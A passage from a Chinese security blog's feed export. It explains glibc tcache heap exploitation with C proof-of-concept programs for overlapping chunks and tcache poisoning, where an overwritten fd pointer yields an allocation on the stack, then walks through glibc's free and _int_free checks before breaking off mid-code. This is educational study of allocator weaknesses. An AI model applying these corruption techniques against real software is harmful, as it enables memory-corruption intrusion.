已经存放的 chunk数量</span></span><br><span class="line">      &#123;</span><br><span class="line">tcache_put (p, tc_idx);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>但是从 <code>ida</code> 里面去看，居然不见了，校验 <code>chunk</code> 的 <code>size</code> 和 指针 后就直接进入 <code>tcache</code> 的处理的流程， 于是这里就算设置 下一个<code>chunk</code> 的 <code>next_chunk-&gt;pre_inuse = 0</code> ,也不会出现 <code>crash</code> 。</p><h2 id="overlapping-chunks-by-caching"><a href="#overlapping-chunks-by-caching" class="headerlink" title="overlapping_chunks_by_caching"></a>overlapping_chunks_by_caching</h2><h3 id="介绍-2"><a href="#介绍-2" class="headerlink" title="介绍"></a>介绍</h3><p><code>overlapping_chunks</code> 这种技术非常经典了， 不过在 <code>tcache</code> 里面就非常的简单了， 修改 <code>chunk</code> 的 <code>size</code> 为 <code>fake_size</code> ， 然后 <code>free</code> 掉它，就会进入 <code>fake_size</code> 对应的 <code>tcache</code> ， 然后在 分配 <code>fake_size</code> 的 <code>chunk</code> 就可以拿到这个 <code>chunk</code> , <strong>overlap chunk</strong></p><h3 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span>* argv[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *mem = <span class="built_in">malloc</span>(<span class="number">0x48</span>);</span><br><span class="line">    <span class="keyword">char</span> *sentry = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">    <span class="built_in">memset</span>(sentry, <span class="string">'b'</span>, <span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"mem: %p, sentry: %p\n"</span>,mem, sentry);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"sentry content: %s\n"</span>, sentry);</span><br><span class="line">    *(<span class="keyword">long</span>* )(mem - <span class="keyword">sizeof</span>(<span class="keyword">long</span>)) = <span class="number">0x110</span>;  <span class="comment">// 设置 chunk-&gt;size = 0x110</span></span><br><span class="line">    <span class="built_in">free</span>(mem);</span><br><span class="line">    <span class="keyword">char</span> *mem2 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);  <span class="comment">// 分配一个 0x110 的chunk</span></span><br><span class="line">    <span class="built_in">memset</span>(mem2, <span class="string">'a'</span>, <span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"mem2: %p\n"</span>, mem2);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"sentry content: %s\n"</span>, sentry);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过修改 <code>mem</code> 所在 <code>chunk</code> 的 <code>size</code> 为 <code>0x110</code></p><p>然后释放掉他 ，然后分配一个 <code>0x110</code> 的 <code>chunk</code> ，我们就会再次分配到它。此时 <code>mem2</code> 的 <code>chunk</code> 包含了 <code>sentry</code> 的 <code>chunk</code></p><h2 id="tcache-poisoning"><a href="#tcache-poisoning" class="headerlink" title="tcache_poisoning"></a>tcache_poisoning</h2><h3 id="介绍-3"><a href="#介绍-3" class="headerlink" title="介绍"></a>介绍</h3><p>通过修改 <code>free</code> 状态的 <code>tcache</code> 里面的 <code>chunk</code> 的 <code>fd</code> （其实就是 <code>tcache_entry-&gt;next</code> ) ，可以分配到任意地址</p><h3 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span>* argv[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> target[<span class="number">6</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"stack: %p\n"</span>,target);</span><br><span class="line">    <span class="keyword">char</span> *mem = <span class="built_in">malloc</span>(<span class="number">0x48</span>);</span><br><span class="line">    <span class="built_in">free</span>(mem);</span><br><span class="line">    *(<span class="keyword">long</span> *)(mem) = (<span class="keyword">long</span>)target; </span><br><span class="line">    <span class="keyword">char</span> *mem1 = <span class="built_in">malloc</span>(<span class="number">0x48</span>);</span><br><span class="line">    <span class="keyword">char</span> *mem2 = <span class="built_in">malloc</span>(<span class="number">0x48</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"mem2: %p\n"</span>, mem2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分配一个 <code>0x50</code> 的 <code>chunk</code> 然后释放它，进入 <code>tcache</code> ，然后修改 <code>fd</code> 为 <code>target</code></p><p>然后分配两次 <code>0x50</code> 的 <code>chunk</code> 就可以分配到 <code>target</code></p><p>成功分配到了 栈上面。</p><p>其实 <code>fd</code> 为任意地址都行，原因在于 <code>tcache_get</code> 直接从 <code>tcache-&gt;entries</code> 里面拿 <code>chunk</code> ， 而不检查 拿到的 <code>chunk</code> 是否合法。</p><p>同时 在 <code>malloc</code> 分配内存时，首先使用 <code>tcache</code> ，而它判断 <code>tcache</code> 有没有可以分配的 <code>chunk</code> , 是直接判断指定项有没有指针。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">  DIAG_PUSH_NEEDS_COMMENT;</span><br><span class="line">  <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins</span><br><span class="line">      &amp;&amp; tcache</span><br><span class="line">      &amp;&amp; tcache-&gt;entries[tc_idx] != <span class="literal">NULL</span>) <span class="comment">// 根据tcache-&gt;entries[tc_idx]是否为空判断是否有chunk</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">  DIAG_POP_NEEDS_COMMENT;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><h1 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h1><p><code>tcache</code> 的引入使得 <code>heap</code> 相关的漏洞的利用非常的简单了。</p><p>简单的原因主要在于 <code>tcache</code> 里面没有做什么检查， 同时还会优先使用这使得原来 <code>malloc</code> 里面的 <code>check</code> 也没有了作用。</p><p><code>free</code> 的话 释放内存如果大小在 <code>tcache</code> 的范围内， 只检测 <strong>size 和 指针</strong> 是否合法，而且检测非常弱。</p><p><code>malloc</code> 时 也是优先使用 <code>tcache</code> ， 只要 <code>tcache-&gt;entries[tc_idx]</code> 非空就可以从 <code>tcache</code> 分配。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a><strong>参考</strong></h1><p><a href="http://tukan.farm/2017/07/08/tcache/" target="_blank" rel="noopener">http://tukan.farm/2017/07/08/tcache/</a></p><p><a href="https://www.anquanke.com/post/id/104760" target="_blank" rel="noopener">https://www.anquanke.com/post/id/104760</a></p><p><a href="https://www.cnblogs.com/hac425/p/9416796.html" target="_blank" rel="noopener">https://www.cnblogs.com/hac425/p/9416796.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;&lt;code&gt;glibc 2.26&lt;/code&gt; 开始引入了 &lt;code&gt;tcache&lt;/code&gt; , 相关的 commit 可以看&lt;br&gt;
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>free源码简单分析</title>
    <link href="https://nocbtm.github.io/2020/02/26/free%E6%BA%90%E7%A0%81%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/"/>
    <id>https://nocbtm.github.io/2020/02/26/free源码简单分析/</id>
    <published>2020-02-26T11:14:51.000Z</published>
    <updated>2020-04-07T03:39:47.606Z</updated>
    
    <content type="html"><![CDATA[<h2 id="GI-libc-free"><a href="#GI-libc-free" class="headerlink" title="_GI___libc_free"></a>_GI___libc_free</h2><p>首先是 _GI___libc_free</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __fastcall _GI___libc_free(<span class="keyword">void</span> *ptr)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( _free_hook )</span><br><span class="line">  &#123;</span><br><span class="line">    _free_hook(ptr, retaddr);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( ptr )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = (<span class="keyword">unsigned</span> __int64)ptr - <span class="number">16</span>;</span><br><span class="line">    v2 = *((_QWORD *)ptr - <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v2 &amp; <span class="number">2</span> )                               <span class="comment">// 判断size位，判断是不是 mmap 获得的 chunk</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !mp_.no_dyn_threshold</span><br><span class="line">        &amp;&amp; v2 &gt; mp_.mmap_threshold</span><br><span class="line">        &amp;&amp; v2 &lt;= <span class="number">0x2000000</span></span><br><span class="line">        &amp;&amp; (v1 &lt; (<span class="keyword">unsigned</span> __int64)dumped_main_arena_start || v1 &gt;= (<span class="keyword">unsigned</span> __int64)dumped_main_arena_end) )</span><br><span class="line">      &#123;</span><br><span class="line">        mp_.mmap_threshold = v2 &amp; <span class="number">0xFFFFFFFFFFFFFFF8</span>LL;</span><br><span class="line">        mp_.trim_threshold = <span class="number">2</span> * (v2 &amp; <span class="number">0xFFFFFFFFFFFFFFF8</span>LL);</span><br><span class="line">      &#125;</span><br><span class="line">      munmap_chunk((mchunkptr)((<span class="keyword">char</span> *)ptr - <span class="number">16</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      av = &amp;main_arena;</span><br><span class="line">      <span class="keyword">if</span> ( v2 &amp; <span class="number">4</span> )</span><br><span class="line">        av = *(malloc_state **)(v1 &amp; <span class="number">0xFFFFFFFFFC000000</span>LL);</span><br><span class="line">      int_free(av, (mchunkptr)v1, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果存在 free_hook ， 就会直接调用 free_hook(ptr) 然后返回。否则判断被 free 的 内存是否是 mmap 获取的 ，如果是则使用 munmap_chunk 回收内存，否则进入 _int_free</p><h2 id="int-free"><a href="#int-free" class="headerlink" title="_int_free"></a>_int_free</h2><p>首先会做一些简单的检查</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"> size = chunksize (p);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//检查指针是否正常，对齐</span></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect ((<span class="keyword">uintptr_t</span>) p &gt; (<span class="keyword">uintptr_t</span>) -size, <span class="number">0</span>)</span><br><span class="line">      || __builtin_expect (misaligned_chunk (p), <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      errstr = <span class="string">"free(): invalid pointer"</span>;</span><br><span class="line">    errout:</span><br><span class="line">      <span class="keyword">if</span> (!have_lock &amp;&amp; locked)</span><br><span class="line">        (<span class="keyword">void</span>) mutex_unlock (&amp;av-&gt;mutex);</span><br><span class="line">      malloc_printerr (check_action, errstr, chunk2mem (p), av);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查 size 是否 &gt;= MINSIZE ，且是否对齐</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (size &lt; MINSIZE || !aligned_OK (size)))</span><br><span class="line">    &#123;</span><br><span class="line">      errstr = <span class="string">"free(): invalid size"</span>;</span><br><span class="line">      <span class="keyword">goto</span> errout;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查 chunk 是否处于 inuse 状态</span></span><br><span class="line">  check_inuse_chunk(av, p);</span><br></pre></td></tr></table></figure><p>检查</p><ul><li>指针是否对齐</li><li>块的大小是否对齐，且大于最小的大小</li><li>块是否在 inuse 状态</li></ul><h2 id="进入-fastbin"><a href="#进入-fastbin" class="headerlink" title="进入 fastbin"></a>进入 fastbin</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(size) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(get_max_fast ())) &#123;</span><br><span class="line">    <span class="keyword">if</span> (have_lock</span><br><span class="line">        || (&#123; assert (locked == <span class="number">0</span>);</span><br><span class="line">          mutex_lock(&amp;av-&gt;mutex);</span><br><span class="line">          locked = <span class="number">1</span>;</span><br><span class="line">          chunk_at_offset (p, size)-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ <span class="comment">// next-&gt;size &lt;= 2 * SIZE_SZ</span></span><br><span class="line">            || chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem; <span class="comment">// </span></span><br><span class="line">          &#125;))</span><br><span class="line">      &#123;</span><br><span class="line">        errstr = <span class="string">"free(): invalid next size (fast)"</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    set_fastchunks(av);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> idx = fastbin_index(size);</span><br><span class="line">    fb = &amp;fastbin (av, idx);</span><br><span class="line"></span><br><span class="line">    mchunkptr old = *fb, old2;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> old_idx = ~<span class="number">0u</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (old == p, <span class="number">0</span>))</span><br><span class="line">      &#123;</span><br><span class="line">        errstr = <span class="string">"double free or corruption (fasttop)"</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">if</span> (have_lock &amp;&amp; old != <span class="literal">NULL</span>)</span><br><span class="line">      old_idx = fastbin_index(chunksize(old));</span><br><span class="line">    p-&gt;fd = old2 = old; <span class="comment">// 插入 fastbin</span></span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">while</span> ((old = catomic_compare_and_exchange_val_rel (fb, p, old2)) != old2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (have_lock &amp;&amp; old != <span class="literal">NULL</span> &amp;&amp; __builtin_expect (old_idx != idx, <span class="number">0</span>))</span><br><span class="line">      &#123;</span><br><span class="line">    errstr = <span class="string">"invalid fastbin entry (free)"</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>如果 size 满足 fastbin 的条件，则首先判断 next_chunk-&gt;size 要满足</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">next_chunk-&gt;size &gt; <span class="number">2</span> * SIZE_SZ</span><br><span class="line">next_chunk-&gt;size &lt; av-&gt;system_mem</span><br></pre></td></tr></table></figure><p>接着就会找对相应的 fastbin ，然后插入 该 bin 的第一项。插入前有一个检查</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (old == p, <span class="number">0</span>))</span><br><span class="line">      &#123;</span><br><span class="line">        errstr = <span class="string">"double free or corruption (fasttop)"</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><p>就是 p-&gt;size 索引到的 fastbin 的第一个指针不能和当前的 p 相同，否则会被认为是 double free</p><h2 id="进入-Unsorted-bin"><a href="#进入-Unsorted-bin" class="headerlink" title="进入 Unsorted bin"></a>进入 Unsorted bin</h2><p>如果被 free 的这个块不是 通过 mmap 获得的，就会进入下面的逻辑</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">else</span> <span class="keyword">if</span> (!chunk_is_mmapped(p)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (! have_lock) &#123;</span><br><span class="line">      (<span class="keyword">void</span>)mutex_lock(&amp;av-&gt;mutex);</span><br><span class="line">      locked = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 得到下一个 chunk 的指针</span></span><br><span class="line">    nextchunk = chunk_at_offset(p, size);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 不能 free top chunk</span></span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (p == av-&gt;top))</span><br><span class="line">      &#123;</span><br><span class="line">        errstr = <span class="string">"double free or corruption (top)"</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line">   <span class="comment">// nextchunk 不能越界，就是限制了 p-&gt;size</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (contiguous (av)</span><br><span class="line">              &amp;&amp; (<span class="keyword">char</span> *) nextchunk</span><br><span class="line">              &gt;= ((<span class="keyword">char</span> *) av-&gt;top + chunksize(av-&gt;top)), <span class="number">0</span>))</span><br><span class="line">      &#123;</span><br><span class="line">    errstr = <span class="string">"double free or corruption (out)"</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="comment">/*p 要被标识为 inuse 状态 */</span></span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (!prev_inuse(nextchunk)))</span><br><span class="line">      &#123;</span><br><span class="line">        errstr = <span class="string">"double free or corruption (!prev)"</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    nextsize = chunksize(nextchunk);</span><br><span class="line">    <span class="comment">// nextsize 在  [ 2 * SIZE_SZ, av-&gt;system_mem] 之间</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (nextchunk-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">    || __builtin_expect (nextsize &gt;= av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">      &#123;</span><br><span class="line">        errstr = <span class="string">"free(): invalid next size (normal)"</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    free_perturb (chunk2mem(p), size - <span class="number">2</span> * SIZE_SZ);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 如果 p的前一个块是 free 状态，就向前合并，通过 p-&gt;pre_inused 判断*/</span></span><br><span class="line">    <span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">      prevsize = p-&gt;prev_size;</span><br><span class="line">      size += prevsize;</span><br><span class="line">      p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">      unlink(av, p, bck, fwd);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;</span><br><span class="line">      <span class="comment">// 获得 nextchunk 的下一个 chunk, 的 pre_inused位</span></span><br><span class="line">      nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 如果 nextchunk 也是 free 状态的，合并</span></span><br><span class="line">      <span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line">        unlink(av, nextchunk, bck, fwd);</span><br><span class="line">        size += nextsize;</span><br><span class="line">      &#125; <span class="keyword">else</span></span><br><span class="line">    clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">      <span class="comment">// 合并的结果放置到 unsorted bin</span></span><br><span class="line">      bck = unsorted_chunks(av);</span><br><span class="line">      fwd = bck-&gt;fd;</span><br><span class="line">      </span><br><span class="line">      <span class="comment">// 防止 unsortedbin 被破坏</span></span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">    &#123;</span><br><span class="line">      errstr = <span class="string">"free(): corrupted unsorted chunks"</span>;</span><br><span class="line">      <span class="keyword">goto</span> errout;</span><br><span class="line">    &#125;</span><br><span class="line">      p-&gt;fd = fwd;</span><br><span class="line">      p-&gt;bk = bck;</span><br><span class="line">      <span class="keyword">if</span> (!in_smallbin_range(size))</span><br><span class="line">    &#123;</span><br><span class="line">      p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">      p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">      bck-&gt;fd = p;</span><br><span class="line">      fwd-&gt;bk = p;</span><br><span class="line"></span><br><span class="line">      set_head(p, size | PREV_INUSE);</span><br><span class="line">      set_foot(p, size);</span><br><span class="line"></span><br><span class="line">      check_free_chunk(av, p);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      size += nextsize;</span><br><span class="line">      set_head(p, size | PREV_INUSE);</span><br><span class="line">      av-&gt;top = p;</span><br><span class="line">      check_chunk(av, p);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果 free 得到的 unsorted bin 的 size(包括合并chunk 得到的) 大于等于 FASTBIN_CONSOLIDATION_THRESHOLD 就会触发 malloc_consolidate</span></span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) &#123;</span><br><span class="line">      <span class="keyword">if</span> (have_fastchunks(av))</span><br><span class="line">    malloc_consolidate(av);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (av == &amp;main_arena) &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> MORECORE_CANNOT_TRIM</span></span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(chunksize(av-&gt;top)) &gt;=</span><br><span 